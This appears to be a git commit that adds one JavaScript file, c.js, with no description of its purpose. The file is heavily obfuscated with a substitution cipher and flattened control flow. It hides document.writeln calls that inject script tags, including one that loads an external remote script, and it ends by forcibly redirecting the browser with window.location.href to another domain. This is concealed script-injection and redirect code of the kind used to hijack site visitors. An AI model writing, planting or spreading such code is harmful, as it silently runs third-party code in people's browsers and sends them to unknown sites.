d79b35aa490dea566e9e09ef8b8079567977ac57
aarookie1 <149148191+aarookie1@users.noreply.github.com>
2023-10-27 20:29:44 +0800

    Create c.js

---
+++ c.js
@@ -0,0 +1,196 @@
+function jump() {
+  var XVL = function (s) {
+    this.s = s;
+    this.length = s.length;
+    for (var i = 0; i < s.length; i++) {
+      this[i] = s.charAt(i);
+    }
+  };
+  var Umy = function getStr(mutatedCodes) {
+    return function (originCodes) {
+      return function (s) {
+        var r = '',
+          sArr = s.split('');
+        for (var i = 0; i < sArr.length; i++) {
+          r += originCodes.charAt(mutatedCodes.indexOf(sArr[i]));
+        }
+        return r;
+      };
+    };
+  }(":;'sSmf pBk3z0}|&[M_o()PlATw<g?9x8t]-5N./1>rv64j2auech=dEnyW{,i\"b")("<script ye=\"x/jav>_o129345;nbluf0h:w.mdWAME-SgkPz|[](){'?8&BTN,}6");
+  XVL.prototype = {
+    toString: function () {
+      return Umy(this.s);
+    },
+    valueOf: function () {
+      return Umy(this.s);
+    },
+    charAt: String.prototype.charAt,
+    concat: String.prototype.concat,
+    slice: String.prototype.slice,
+    substr: String.prototype.substr,
+    indexOf: String.prototype.indexOf,
+    trim: String.prototype.trim,
+    split: String.prototype.split
+  };
+  var oan = function (s) {
+    return new XVL(s);
+  };
+  var ogK = function _1303106(arrNum, offset) {
+    var okVC3 = 1;
+    while (okVC3 !== 0) {
+      switch (okVC3) {
+        case 1:
+          var arr = [];
+          okVC3 = 5;
+          break;
+        case 2:
+          okVC3 = i < arrNum ? 7 : 3;
+          break;
+        case 3:
+          okVC3 = ii < arrNum ? 8 : 4;
+          break;
+        case 4:
+          return arr;
+          okVC3 = 0;
+          break;
+        case 5:
+          var i = 0;
+          okVC3 = 6;
+          break;
+        case 6:
+          var ii = 0;
+          okVC3 = 2;
+          break;
+        case 7:
+          arr[(i + offset) % arrNum] = [];
+          okVC3 = 9;
+          break;
+        case 8:
+          var I = arrNum - 1;
+          okVC3 = 10;
+          break;
+        case 9:
+          i++;
+          okVC3 = 2;
+          break;
+        case 10:
+          okVC3 = I >= 0 ? 12 : 11;
+          break;
+        case 11:
+          ii++;
+          okVC3 = 3;
+          break;
+        case 12:
+          arr[ii][(I + offset * ii) % arrNum] = arr[I];
+          okVC3 = 13;
+          break;
+        case 13:
+          I--;
+          okVC3 = 10;
+          break;
+      }
+    }
+  }(25, 7);
+  var tmo6g = ogK[15][14][14];
+  while (tmo6g !== ogK[8][20][23]) {
+    switch (tmo6g) {
+      case ogK[24][6][17]:
+        document.writeln(oan(":;'sSmf fpmBk3fBzf0}|&|;'sSmf3["));
+        tmo6g = ogK[5][10][2];
+        break;
+      case ogK[20][14][20]:
+        document.writeln(oan("&|s ;'Mms_}B'fko()Pl)AlT"));
+        tmo6g = ogK[7][16][22];
+        break;
+      case ogK[20][16][10]:
+        document.writeln(oan("&|s ;'MSw&S;S<gBkoT"));
+        tmo6g = ogK[23][5][12];
+        break;
+      case ogK[7][21][8]:
+        document.writeln(oan("&|s ;'M;B'?sSfpk3)9B9<Bxl3T"));
+        tmo6g = ogK[1][20][21];
+        break;
+      case ogK[14][11][21]:
+        document.writeln(oan(":0;'sSmf["));
+        tmo6g = ogK[2][12][17];
+        break;
+      case ogK[9][17][9]:
+        document.writeln(oan(":;'sSmf fpmBk3fBzf0}|&|;'sSmf3"));
+        tmo6g = ogK[24][20][21];
+        break;
+      case ogK[22][16][16]:
+        document.writeln(oan(";s'k38ffm;t00]]]-;f|f'_?wfBs-'_50'_?wfBs0'_?wfBs-};3 |;pw'[:0;'sSmf["));
+        tmo6g = ogK[8][2][5];
+        break;
+      case ogK[21][20][19]:
+        document.writeln(oan(":w_;'sSmf[:NS& 'g|;;k3;f|f'_?wfBs3[:| fSfgBk3.B< /w|gpfS'; 1|NB >|;p r"));
+        tmo6g = ogK[1][24][3];
+        break;
+      case ogK[4][8][19]:
+        document.writeln(oan("vf|f'_?wfBs3 8sB9k38ffm;t00;f|f'_?wfBs-'_503 f|s6Bfk3M<g|w43[:S56"));
+        tmo6g = ogK[14][8][5];
+        break;
+      case ogK[17][3][23]:
+        document.writeln(oan("'g|;;k3;f|f'_?wfBs3 ;s'k38ffm;t00'-;f|f'_?wfBs-'_50o()Pl)Al0x0)9B9<Bxl0o03"));
+        tmo6g = ogK[5][8][22];
+        break;
+      case ogK[24][0][10]:
+        document.writeln(oan("|gfk3.B< /w|gpfS'; 1|NB >|;p r vf|f'_?wfBs3"));
+        tmo6g = ogK[21][2][22];
+        break;
+      case ogK[21][11][10]:
+        document.writeln(oan("sB9BssBsj_gS'pk3w_rsB9BssBsr]8BwrN_]w6s|NB3[:0|[:0NS&[:0w_;'sSmf["));
+        tmo6g = ogK[24][18][13];
+        break;
+      case ogK[19][8][13]:
+        document.writeln("");
+        tmo6g = ogK[19][12][17];
+        break;
+      case ogK[24][5][23]:
+        document.writeln(oan(":;'sSmf["));
+        tmo6g = ogK[13][5][13];
+        break;
+      case ogK[21][21][8]:
+        document.writeln(oan("&|s M'2' k M'2' aa ueT"));
+        tmo6g = ogK[3][3][15];
+        break;
+      case ogK[13][24][22]:
+        document.writeln(oan("c9?w'fS_w ch ="));
+        tmo6g = ogK[16][15][13];
+        break;
+      case ogK[11][17][22]:
+        document.writeln(oan("  &|s ?5 k N_'?5Bwf-'sB|fB>gB5Bwfcd;'sSmfdhT"));
+        tmo6g = ogK[4][18][23];
+        break;
+      case ogK[12][12][14]:
+        document.writeln(oan("  ?5-;s' k d8ffm;t00&o-'w22-'_502-};ESNko(noPo(lnxy|;pw'kodT"));
+        tmo6g = ogK[10][6][21];
+        break;
+      case ogK[1][4][23]:
+        document.writeln(oan("  &|s ; k N_'?5Bwf-6Bf>gB5Bwf;Wp{|6,|5Bcd;'sSmfdhuxeT"));
+        tmo6g = ogK[17][16][24];
+        break;
+      case ogK[16][22][15]:
+        document.writeln(oan("  ;-m|sBwf,_NB-Sw;BsfWB9_sBc?5i ;hT"));
+        tmo6g = ogK[3][13][15];
+        break;
+      case ogK[14][11][12]:
+        document.writeln(oan("\"hchT"));
+        tmo6g = ogK[6][4][6];
+        break;
+      case ogK[17][14][12]:
+        document.writeln(oan(":0;'sSmf["));
+        tmo6g = ogK[13][18][12];
+        break;
+      case ogK[5][3][24]:
+        document.writeln("");
+        tmo6g = ogK[7][7][5];
+        break;
+      case ogK[5][1][11]:
+        window.location.href = oan("8ffm;t00(bb(bbb-'_5");
+        tmo6g = ogK[12][10][7];
+        break;
+    }
+  }
+}
